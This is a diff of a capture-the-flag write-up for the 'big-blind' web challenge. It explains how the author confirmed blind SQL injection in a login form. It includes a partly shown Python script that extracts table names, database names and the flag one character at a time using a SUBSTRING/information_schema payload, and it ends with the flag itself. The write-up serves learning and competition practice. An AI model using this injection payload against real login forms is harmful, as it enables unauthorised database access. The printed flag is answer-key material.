@@ -1,4 +1,9 @@
--From the title "Big Blind" I assumed this was some kind of Blind Injection, probably SQL, but I didn't want to assume anything.
+##big-blind 136 solves / 444 points ##
+## Description:
+https://big-blind.hsc.tf
+## Solution:
+
+-From the title "Big Blind" I was fairly sure this was some kind of Blind Injection, probably SQL, but I didn't want to assume anything.
 -Sending a single ' returned a 500 internal server error, backing up my theory that it was probably blind SQL injection.
 
 -After trying a few different things, using the sleep function didn't return an error, but didn't seem to do anything.
@@ -16,9 +21,7 @@ the database's contents.
 
 -The script is here, I modified it to make it run for each different function, and in this form it is configured for 
 enumerating the flag, which was the last time I used it(sorry if its a bit messy):
-
-
-
+```
 import requests
 url = "https://big-blind.hsc.tf/"
 payload = "user=ad'+'min&pass='+AND+IF(NOT+SUBSTRING((SELECT+TABLE_NAME+FROM+information_schema.tables+LIMIT+1),1,{})='{}',(SELECT+table_name+FROM+information_schema.tables),'a')#"
@@ -84,3 +87,7 @@ while thing < maxi:
 print("Database Names: ")
 for name in dbNames:
     print(str(name))
+    
+```    
+## Flag:
+flag{any_info_is_good_info}
